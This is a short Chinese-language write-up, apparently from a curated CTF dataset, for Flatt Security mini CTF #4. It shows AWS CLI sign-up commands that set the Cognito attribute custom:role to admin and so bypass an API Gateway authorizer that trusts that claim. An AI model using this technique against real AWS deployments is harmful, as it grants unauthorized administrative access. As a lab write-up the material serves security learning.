---
title: Flatt Security mini CTF #4 Writeups
contest: Flatt Security mini CTF #4
year: 2024
difficulty: medium
vuln_type: web_unknown
tags: [aws, cognito, cognito-idp, sign-up, custom-role, admin, apigateway]
attack_chain:
  - AWS Cognito User Pool
  - sign-up注入user-attributes
  - aws cognito-idp sign-up --user-attributes Name="custom:role",Value="admin"
  - API Gateway authorizer检查payload["custom:role"] === "admin"
  - 攻击: 注册时直接设置role=admin
  - 第二个payload检查custom:tenant
key_payload: aws cognito-idp sign-up --user-attributes Name="custom:role",Value="admin"
one_liner: Flatt Security mini CTF #4：AWS Cognito注册注入custom:role=admin
lesson: Cognito注册时可注入custom属性绕过authorizer
quality: medium
---

# Flatt Security mini CTF #4 Writeups

## 题目信息
- 比赛：Flatt Security mini CTF #4
- 类别：Web（AWS）
- 工具：AWS CLI

## 关键攻击链
### 1. AWS Cognito 注册
```bash
aws cognito-idp sign-up \
  --region "ap-northeast-1" \
  --client-id "21[reducted]9t" \
  --username "evilman" \
  --password "fdsajkj3irfjkjfisadj4A!" \
  --no-sign-request
```

### 2. 注入 custom 属性
```bash
aws cognito-idp sign-up \
  --region "ap-northeast-1" \
  --client-id "21[reducted]9t" \
  --username "evilman2" \
  --password "fdsajkj3irfjkjfisadj4A!" \
  --no-sign-request \
  --user-attributes Name="custom:role",Value="admin"
```

### 3. API Gateway Authorizer
```javascript
if (payload["custom:role"] !== "admin") {
    return denyPolicy(event.methodArn, "not admin");
}
return allowPolicy(event.methodArn, {
    tenant: payload["custom:tenant"],
});
```

## 关键技术点
- Cognito User Pool `--user-attributes` 参数注入 `custom:*` 属性
- API Gateway Lambda Authorizer 验证 ID Token claims
- `custom:role` 字段可由注册者控制

## 评分
- quality: medium（AWS Cognito 注入思路 + API Gateway authorizer 旁路）
